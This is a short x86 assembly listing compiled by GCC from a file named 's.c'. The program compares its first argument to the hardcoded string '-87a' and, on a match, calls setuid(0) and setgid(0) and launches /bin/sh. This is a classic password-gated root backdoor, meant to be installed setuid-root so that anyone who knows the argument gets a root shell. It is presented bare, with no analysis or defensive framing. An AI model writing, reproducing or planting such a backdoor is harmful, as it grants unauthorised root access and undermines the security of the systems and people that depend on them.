	.file	"s.c"
	.version	"01.01"
gcc2_compiled.:
.section	.rodata
.LC0:
	.string	"-87a"
.LC1:
	.string	"/bin/sh"
.text
	.align 4
.globl main
	.type	 main,@function
main:
	pushl %ebp
	movl %esp,%ebp
	cmpl $2,8(%ebp)
	jne .L2
	pushl $.LC0
	movl 12(%ebp),%eax
	addl $4,%eax
	movl (%eax),%edx
	pushl %edx
	call strcmp
	addl $8,%esp
	movl %eax,%eax
	testl %eax,%eax
	jne .L2
	pushl $0
	call setuid
	addl $4,%esp
	pushl $0
	call setgid
	addl $4,%esp
	pushl $.LC1
	call system
	addl $4,%esp
.L2:
.L1:
	leave
	ret
.Lfe1:
	.size	 main,.Lfe1-main
	.ident	"GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
